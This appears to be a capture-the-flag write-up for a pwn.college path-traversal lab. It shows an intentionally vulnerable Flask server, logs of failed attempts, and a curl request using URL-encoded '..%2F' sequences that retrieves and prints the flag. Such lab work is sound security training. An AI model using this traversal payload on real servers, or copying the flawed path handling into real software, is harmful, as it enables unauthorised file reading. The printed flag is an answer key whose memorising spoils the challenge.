@@ -1,0 +1,88 @@
+//Path Traversal using URL encoding 
+
+terminal 1:
+hacker@web-security~path-traversal-2:~$ cd /challenge/
+hacker@web-security~path-traversal-2:/challenge$ ls
+DESCRIPTION.md  files  server
+hacker@web-security~path-traversal-2:/challenge$ cat server 
+#!/usr/bin/exec-suid -- /usr/bin/python3 -I
+
+import flask
+import os
+
+app = flask.Flask(__name__)
+
+
+@app.route("/content", methods=["GET"])
+@app.route("/content/<path:path>", methods=["GET"])
+def challenge(path="index.html"):
+    requested_path = app.root_path + "/files/" + path.strip("/.")
+    print(f"DEBUG: {requested_path=}")
+    try:
+        return open(requested_path).read()
+    except PermissionError:
+        flask.abort(403, requested_path)
+    except FileNotFoundError:
+        flask.abort(404, f"No {requested_path} from directory {os.getcwd()}")
+    except Exception as e:
+        flask.abort(500, requested_path + ":" + str(e))
+
+
+app.secret_key = os.urandom(8)
+app.config["SERVER_NAME"] = f"challenge.localhost:80"
+app.run("challenge.localhost", 80)
+hacker@web-security~path-traversal-2:/challenge$ /challenge/server
+ * Serving Flask app 'server'
+ * Debug mode: off
+WARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.
+ * Running on http://challenge.localhost:80
+Press CTRL+C to quit
+127.0.0.1 - - [27/Sep/2026 14:35:55] "GET / HTTP/1.1" 404 -
+127.0.0.1 - - [27/Sep/2026 14:36:19] "GET / HTTP/1.1" 404 -
+127.0.0.1 - - [27/Sep/2026 14:36:36] "GET / HTTP/1.1" 404 -
+127.0.0.1 - - [27/Sep/2026 14:36:49] "GET / HTTP/1.1" 404 -
+127.0.0.1 - - [27/Sep/2026 14:37:48] "GET / HTTP/1.1" 404 -
+DEBUG: requested_path='/challenge/files/index.html'
+127.0.0.1 - - [27/Sep/2026 14:39:06] "GET /content HTTP/1.1" 200 -
+127.0.0.1 - - [27/Sep/2026 14:39:34] "GET /flag HTTP/1.1" 404 -
+DEBUG: requested_path='/challenge/files/aaa/../../flag'
+127.0.0.1 - - [27/Sep/2026 14:39:55] "GET /content/aaa/../../flag HTTP/1.1" 404 -
+DEBUG: requested_path='/challenge/files/aaa/../../../flag'
+127.0.0.1 - - [27/Sep/2026 14:40:11] "GET /content/aaa/../../../flag HTTP/1.1" 404 -
+DEBUG: requested_path='/challenge/files/aaa/../../../flag'
+127.0.0.1 - - [27/Sep/2026 14:40:23] "GET /content/aaa/../../../flag HTTP/1.1" 404 -
+DEBUG: requested_path='/challenge/files/aaa/../../../flag'
+127.0.0.1 - - [27/Sep/2026 14:40:50] "GET /content/aaa/../../../flag HTTP/1.1" 404 -
+DEBUG: requested_path='/challenge/files/aaa/../../../../flag'
+127.0.0.1 - - [27/Sep/2026 14:42:12] "GET /content/aaa/../../../../flag HTTP/1.1" 404 -
+DEBUG: requested_path='/challenge/files/aaa/../../../../flag'
+127.0.0.1 - - [27/Sep/2026 14:42:55] "GET /content/aaa/../../../../flag HTTP/1.1" 404 -
+127.0.0.1 - - [27/Sep/2026 14:42:57] "GET /flag HTTP/1.1" 404 -
+127.0.0.1 - - [27/Sep/2026 14:43:11] "GET /flag HTTP/1.1" 404 -
+DEBUG: requested_path='/challenge/files/aaa/../../../../flag'
+127.0.0.1 - - [27/Sep/2026 14:43:44] "GET /content/aaa/../../../../flag HTTP/1.1" 404 -
+DEBUG: requested_path='/challenge/files/aaa/../../../../flag'
+127.0.0.1 - - [27/Sep/2026 14:43:50] "GET /content/aaa/../../../../flag HTTP/1.1" 404 -
+DEBUG: requested_path='/challenge/files/aaa/../../../../flag'
+127.0.0.1 - - [27/Sep/2026 14:43:55] "GET /content/aaa/../../../../flag HTTP/1.1" 404 -
+DEBUG: requested_path='/challenge/files/aaa/../../../flag'
+127.0.0.1 - - [27/Sep/2026 14:44:40] "GET /content/aaa/../../../flag HTTP/1.1" 404 -
+DEBUG: requested_path='/challenge/files/aaa/../../../../flag'
+127.0.0.1 - - [27/Sep/2026 14:45:46] "GET /content/aaa/..%2F..%2F..%2F..%2Fflag HTTP/1.1" 404 -
+DEBUG: requested_path='/challenge/files/aaa/../../../../flag'
+127.0.0.1 - - [27/Sep/2026 14:45:58] "GET /content/aaa/..%2F..%2F..%2F..%2Fflag HTTP/1.1" 404 -
+DEBUG: requested_path='/challenge/files/fortunes/../../../flag'
+127.0.0.1 - - [27/Sep/2026 14:46:30] "GET /content/fortunes/..%2F..%2F..%2Fflag HTTP/1.1" 200 -
+
+
+
+And in terminal try to make connection using path traversal, encode only the '/' becasue
+The vulnerable line is ""  path.strip("/.")  ""
+
+so,
+
+Terminal 2:
+
+hacker@web-security~path-traversal-2:/challenge$ curl --path-as-is 'http://challenge.localhost/content/fortunes/..%2F..%2F..%2Fflag'
+pwn.college{0eVQqmcUOd5t38PVCfEemVwoYqx.QXyYTN2wCN2cDOxIzW}
+hacker@web-security~path-traversal-2:/challenge$ 
